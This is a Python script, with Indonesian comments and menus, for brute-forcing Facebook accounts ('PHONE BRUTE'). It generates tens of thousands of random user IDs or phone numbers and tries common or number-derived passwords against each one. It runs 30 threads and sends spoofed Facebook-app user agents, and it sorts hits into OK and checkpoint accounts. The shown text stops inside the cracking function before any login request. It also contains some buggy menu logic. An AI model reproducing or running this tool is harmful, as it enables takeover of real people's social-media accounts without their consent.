#!/usr/bin/python3
#-*-coding:utf-8-*-
# tools random cracking 2024-2025
# bila ada kekurangan silakan fix sendiri
# bye Script Kiddie - fb@1.2.7.0.0.0.localhost

P = '\x1b[1;97m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;30m"
FM = '\033[0;41m'
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')

import os
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    import bs4
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize bs4 requests futures==2 > /dev/null')
    os.system('python 123.py')


import requests,json,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform
from bs4 import BeautifulSoup as sop

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen2.append(uaku2)
    
def kiddiee(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :kiddie = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :kiddie = ' ~> 2009'
        elif uid[:8] in ['10000000']        :kiddie = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:kiddie = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:kiddie = ' 2010'
        elif uid[:6] in ['100001']          :kiddie = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :kiddie = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :kiddie = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :kiddie = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :kiddie = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :kiddie = ' ~> 2015'
        elif uid[:5] in ['10001']           :kiddie = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :kiddie = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :kiddie = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :kiddie = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :kiddie = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:kiddie = ' ~> 2021'
        elif uid[:5] in ['10008']           :kiddie = ' ~>2022'
        elif uid[:5] in ['10009']           :kiddie = ' ~> 2023'
        else:kiddie=''
    elif len(uid) in [9,10]:
        kiddie = ' ~> 2008/2009'
    elif len(uid)==8:
        kiddie = ' ~> 2007/2008'
    elif len(uid)==7:
        kiddie = ' ~> 2006/2007'
    else:kiddie=''
    return kiddie

def useragent():
	mix_model = requests.get('https://gist.githubusercontent.com/Nox-Naved/f0fe39c5e9ff2b70bcb39e48a3e77301/raw/413a4f26f81da4f40d51349a87facc2894bc0531/600+').text.splitlines()
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_vercode = str(random.randint(10000000, 66666666))
	ua1 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	ua2 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X008D;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	ua3 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=1.5,width=480,height=854};FBLC/pt_PT;FBRV/82651122;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00BD;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua4 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1352};FBLC/it_IT;FBRV/203912779;FBCR/ho.;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	ua5= f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.778567894596777,width=1136,height=1485};FBLC/en_US;FBRV/0;FBCR/Comium;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/A21;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
	sex = random.choice([ua1,ua2,ua3,ua4,ua5])
	ugen = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(mix_model)} Build/TP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + sex
	return ugen(sex)
    
loop = 0
oks = []
cps = []
user = []
#----------------------■ LOOP ■----------------------#
loop = 0;oks = [];cps = [];id = [];ck = []
#----------------------■ COLOUR ■----------------------#
wx='\x1b[1;97m';gx='\x1b[38;5;48m';bx='\x1b[38;5;8m';yx="\033[1;33m";px="\33[1;34m";rx='\x1b[38;5;196m'
#----------------------■ STYLE ■----------------------#
xd=f"{rx}<{wx}■{rx}>{gx}";xd1=f"{rx}<{wx}1{rx}>{gx}";xd2=f"{rx}<{wx}2{rx}>{gx}";xd3=f"{rx}<{wx}3{rx}>{gx}";xd4=f"{rx}<{wx}4{rx}>{gx}";xd5=f"{rx}<{wx}5{rx}>{gx}";xd0=f"{rx}<{wx}0{rx}>{gx}";xdx=f"{rx}<{wx}?{rx}>{gx}";xdxx=f"{rx}{wx}━➤{rx}{gx}"
#----------------------■ CLEAR ■----------------------#
def Gen(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

def banner():
	os.system("clear")
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER   \033[1;31m   ➟   \033[1;32mScript Kiddie (\033[1;37mupdate 2025\033[1;32m)      \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK \033[1;31m   ➟   \033[1;32mI'M SCRIPT KIDDIE                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mINFORMATION \033[1;31m➟  \033[1;32m INDONESIAN SILENT PEOPLE         \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION \033[1;31m    ➟   \033[1;32m1.0 📶 \033[1;37mwiffi onli            \033[1;31m       │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	print("")
def linex():
	print("%s════════════════════════════════════════════%s"%(Z,N))
def result(OK,cp):
	if len(OK) != 0 or len(cp) != 0:
		print("\n\033[94;1m THE PROCESS HAS BEEN COMPLETED")
		print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: %s/%s"%(str(len(OK)),str(len(cp))))
		os.sys.exit()
	else:
		print('\n[%s!%s] NO RESULT YOUR BAD LOCK :(:('%(H,H));exit()

def scriptkiddie():
	os.system('clear')
	#banner()
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞01  \033[1;32mRANDOM NUM CRACK \033[1;31m ➟ off                        \033[1;31m   │
\033[1;31m│\033[1;37m☞02  \033[1;32mRANDOM UID CRACK \033[1;31m ➟ off                          \033[1;31m │
\033[1;31m│\033[1;37m☞03  \033[1;32mHUBUNGI DEVELOPER\033[1;31m ➟ off                           │
\033[1;31m│\033[1;37m☞04  \033[1;32mKELUAR PROGRAM \033[1;31m   ➟ off                   \033[1;31m        │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	opt = input(f'{B} CHOOSE : {H}')
	if opt =='1':
		methode()
	elif opt =='2':
		methode()
	elif opt =='3':
		os.system("https://www.facebook.com/1.2.7.0.0.0.localhost")
	elif opt =='3':
		exit()
	else:
		print('\n\033[1;31m CHOOSE A VALID OPTION\033[0;97m')

def methode():
	os.system('clear')
	print(f'        \033[1;37m\033[41m\033[1;37m[ 𓆩𝐒𝐄𝐒𝐔𝐀𝐈 𝐏𝐈𝐋𝐈𝐇𝐀𝐍 𝐀𝐖𝐀𝐋 𝐌𝐄𝐓𝐇𝐎𝐃𝐄 𝐍𝐔𝐌/𝐔𝐈𝐃𓆪 ]\x1b[0m\033[1;36m ')
	#linex()
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞01  \033[1;32mMETHODE NUM GRAPH\033[1;31m ➟ off                        \033[1;31m   │
\033[1;31m│\033[1;37m☞02  \033[1;32mMETHODE NUM B-API \033[1;31m➟ off                          \033[1;31m │
\033[1;31m│\033[1;37m☞03  \033[1;32mMETHODE UID GRAPH \033[1;31m➟ off                           │
\033[1;31m│\033[1;37m☞04  \033[1;32mMETHODE UID B-API \033[1;31m➟ off                   \033[1;31m        │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	#linex()
	opt = input(f'{B} CHOOSE : {H}')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_number2()
	elif opt =='3':
		random_uid()
	elif opt =='4':
		random_uid2()
	elif opt =='5':
		scriptkiddie()
	else:
		print('\n\033[1;31m CHOOSE A VALID OPTION\033[0;97m')
		
###### RANDOM USER-ID 1 ##########
#######BYE SCRIPT KIDDIE##########
###############################	
def random_uid():
	user=[]
	os.system('clear')
	#banner()
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(9))
		user.append("100000"+nmp)
	print(f'          \033[1;37m\033[41m\033[1;37m[ 𓆩𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝟏𝟐𝟑𝟒𝟓𝟔/𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𓆪 ]\x1b[0m\033[1;36m ')
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞PASSWORD 1  \033[1;32m123456\033[1;31m ➟ off                           \033[1;31m   │
\033[1;31m│\033[1;37m☞PASSWORD 2  \033[1;32m1234567 \033[1;31m➟ off                            \033[1;31m │
\033[1;31m│\033[1;37m☞PASSWORD 3  \033[1;32m12345678 \033[1;31m➟ off                            │
\033[1;31m│\033[1;37m☞PASSWORD 4  \033[1;32m123456789 \033[1;31m➟ off                   \033[1;31m        │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	pwx = input(f' {B}MAUKAN PASSWORD : {H}').split(',')
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		#banner()
		tl = str(len(user))
		print(f'           \033[1;37m\033[41m\033[1;37m[ 𓆩𝐁𝐑𝐔𝐓𝐄 𝐅𝐎𝐑𝐂𝐄 𝐒𝐄𝐃𝐀𝐍𝐆 𝐁𝐄𝐑𝐋𝐀𝐍𝐆𝐒𝐔𝐍𝐆𓆪 ]\x1b[0m\033[1;36m ')
		print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mTOTAL IDS TARGET\033[1;31m ➟ {tl}                        \033[1;31m    │
\033[1;31m│\033[1;37m☞  \033[1;32mBRUTE FORCE SEDANG BERLANGSUNG\033[1;31m                      │
\033[1;31m│\033[1;37m☞  \033[1;32mMAINKAN MODE PESAWAT\033[1;31m                                │
\033[1;31m│\033[1;37m☞  \033[1;32mATAU BISA GUNAKAN ON/OFF DATA \033[1;31m \033[1;31m                     │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
		#linex()
		for uid in user:
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)

###### RANDOM NUMBER 1 #########
#######BYE SCRIPT KIDDIE##########
###############################	
def random_number():
	user=[]
	os.system('clear')
	print(f'        \033[1;37m\033[41m\033[1;37m[ 𓆩𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐂𝐎𝐍𝐓𝐎𝐇 𝐍𝐎𝐌𝐎𝐑 +𝟏𝟐𝟏𝟐𝟖𝟗𝟔𝟓𝟓𝐱𝐱𝐱𝐱𓆪 ]\x1b[0m\033[1;36m ')
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mMASUKAN NOMOR TARGET\033[1;31m                             \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mCONTOH TARGET +121289655xxxx \033[1;31m                       │
\033[1;31m│\033[1;37m☞  \033[1;32mEXAMPLE CODE 1\033[1;31m ➟ +882 +881 +1212                    │
\033[1;31m│\033[1;37m☞  \033[1;32mEXAMPLE CODE 2 \033[1;31m➟ +880 +1211 +1213   \033[1;31m                │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	fkode = input(f'{B} MASUKAN TARGET : {H}')
	if len(fkode) < 10:
		Gen(f'\n{M} ERROR! MAYBE YOU PUT THE WRONG NUMBER ')
		time.sleep(2)
		random_number()
	else:
		pass
	kode = fkode[0:-7]
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	print(f"\n {M}EXAMPLE : {Z}[{H}6,7,8,9,10,11{Z}]\n")
	psl = int(input(f" {B}PASS LENGHT : {H}"))
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		#banner()
		tl = str(len(user))
		print(f'           \033[1;37m\033[41m\033[1;37m[ 𓆩𝐁𝐑𝐔𝐓𝐄 𝐅𝐎𝐑𝐂𝐄 𝐒𝐄𝐃𝐀𝐍𝐆 𝐁𝐄𝐑𝐋𝐀𝐍𝐆𝐒𝐔𝐍𝐆𓆪 ]\x1b[0m\033[1;36m ')
		print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mTOTAL IDS TARGET\033[1;31m ➟ {tl}                        \033[1;31m    │
\033[1;31m│\033[1;37m☞  \033[1;32mBRUTE FORCE SEDANG BERLANGSUNG\033[1;31m                      │
\033[1;31m│\033[1;37m☞  \033[1;32mMAINKAN MODE PESAWAT\033[1;31m                                │
\033[1;31m│\033[1;37m☞  \033[1;32mATAU BISA GUNAKAN ON/OFF DATA \033[1;31m \033[1;31m                     │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
		#linex()
		for guru in user:
			uid = kode+guru
			pwx = [uid[-psl:]]
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)


###### RANDOM USER-ID 2 ##########
#######BYE SCRIPT KIDDIE##########
###############################	
def random_uid2():
	user=[]
	os.system('clear')
	banner()
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(9))
		user.append("100000"+nmp)
	print(f'          \033[1;37m\033[41m\033[1;37m[ 𓆩𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝟏𝟐𝟑𝟒𝟓𝟔/𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𓆪 ]\x1b[0m\033[1;36m ')
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑??𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞PASSWORD 1  \033[1;32m123456\033[1;31m ➟ off                           \033[1;31m   │
\033[1;31m│\033[1;37m☞PASSWORD 2  \033[1;32m1234567 \033[1;31m➟ off                            \033[1;31m │
\033[1;31m│\033[1;37m☞PASSWORD 3  \033[1;32m12345678 \033[1;31m➟ off                            │
\033[1;31m│\033[1;37m☞PASSWORD 4  \033[1;32m123456789 \033[1;31m➟ off                   \033[1;31m        │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	pwx = input(f' {B}MASUKAN PASSWORD : {H}').split(',')
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		#banner()
		tl = str(len(user))
		print(f'           \033[1;37m\033[41m\033[1;37m[ 𓆩𝐁𝐑𝐔𝐓𝐄 𝐅𝐎𝐑𝐂𝐄 𝐒𝐄𝐃𝐀𝐍𝐆 𝐁𝐄𝐑𝐋𝐀𝐍𝐆𝐒𝐔𝐍𝐆𓆪 ]\x1b[0m\033[1;36m ')
		print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mTOTAL IDS TARGET\033[1;31m ➟ {tl}                        \033[1;31m    │
\033[1;31m│\033[1;37m☞  \033[1;32mBRUTE FORCE SEDANG BERLANGSUNG\033[1;31m                      │
\033[1;31m│\033[1;37m☞  \033[1;32mMAINKAN MODE PESAWAT\033[1;31m                                │
\033[1;31m│\033[1;37m☞  \033[1;32mATAU BISA GUNAKAN ON/OFF DATA \033[1;31m \033[1;31m                     │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
		#linex()
		for uid in user:
			zim.submit(cracker2,uid,pwx,tl)
	result(oks,cps)

###### RANDOM NUMBER 2 #########
#######BYE SCRIPT KIDDIE##########
###############################	
def random_number2():
	user=[]
	os.system('clear')
	print(f'        \033[1;37m\033[41m\033[1;37m[ 𓆩𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐂𝐎𝐍𝐓𝐎𝐇 𝐍𝐎𝐌𝐎𝐑 +𝟏𝟐𝟏𝟐𝟖𝟗𝟔𝟓𝟓𝐱𝐱𝐱𝐱𓆪 ]\x1b[0m\033[1;36m ')
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mMASUKAN NOMOR TARGET\033[1;31m                             \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mCONTOH TARGET +121289655xxxx \033[1;31m                       │
\033[1;31m│\033[1;37m☞  \033[1;32mEXAMPLE CODE 1\033[1;31m ➟ +882 +881 +1212                    │
\033[1;31m│\033[1;37m☞  \033[1;32mEXAMPLE CODE 2 \033[1;31m➟ +880 +1211 +1213   \033[1;31m                │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	fkode = input(f'{K} MASUKAN NOMOR : {H}')
	if len(fkode) < 10:
		Gen(f'\n{M} ERROR! MAYBE YOU PUT THE WRONG NUMBER ')
		time.sleep(2)
		random_number2()
	else:
		pass
	kode = fkode[0:-7]
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
		#banner()
	print(f"\n {M}EXAMPLE : {Z}[{H}6,7,8,9,10,11{Z}]\n")
	psl = int(input(f" {B}PASS LENGHT : {H}"))
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		#banner()
		tl = str(len(user))
		print(f'           \033[1;37m\033[41m\033[1;37m[ 𓆩𝐁𝐑𝐔𝐓𝐄 𝐅𝐎𝐑𝐂𝐄 𝐒𝐄𝐃𝐀𝐍𝐆 𝐁𝐄𝐑𝐋𝐀𝐍𝐆𝐒𝐔𝐍𝐆𓆪 ]\x1b[0m\033[1;36m ')
		print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mTOTAL IDS TARGET\033[1;31m ➟ {tl}                        \033[1;31m    │
\033[1;31m│\033[1;37m☞  \033[1;32mBRUTE FORCE SEDANG BERLANGSUNG\033[1;31m                      │
\033[1;31m│\033[1;37m☞  \033[1;32mMAINKAN MODE PESAWAT\033[1;31m                                │
\033[1;31m│\033[1;37m☞  \033[1;32mATAU BISA GUNAKAN ON/OFF DATA \033[1;31m \033[1;31m                     │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
		#linex()
		for guru in user:
			uid = kode+guru
			pwx = [uid[-psl:]]
			zim.submit(cracker2,uid,pwx,tl)
	result(oks,cps)

##### CRACKING METHOD GRAPH #####
########BYE SCRIPT KIDDIE#########
###############################	
def cracker(user,pwx,tl):
	global loop
	global oks
	global cps
	try:
		for pw in pwx:
			animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
			print(f"\r {animation} {N}{loop}{N}/{M}{len(user)} {N}[{H}OK:{len(oks)}{N}][{K}CP:{len(cps)}{N}] [{H}{'{:.1%}'.format(loop/float(len(user)))}{N}]"%(loop,len(user),oks,cps),end=" ");sys.stdout.flush()
			for i in range(50):
				time.sleep(0.1)
				sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
				sys.stdout.flush()
			#print(f"\r {animation} {N}{loop}{N}/{M}{len(user)} {N}[{H}OK:{len(oks)}{N}][{K}CP:{len(cps)}{N}] [{H}{'{:.1%}'.format(loop/float(len(user)))}{N}]"%(loop,len(user),oks,cps),end=" ");sys.stdout.flush()
			#sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(user)} {N}[{H}OK:{len(oks)}{N}][{K}CP:{len(cps)}{N}] [{H}{'{:.1%}'.format(loop/float(len(user)))}{N}] " + animation[i % len(animation)]+"\x1b[0m ")
			#sys.stdout.flush()
			ses=requests.Session()
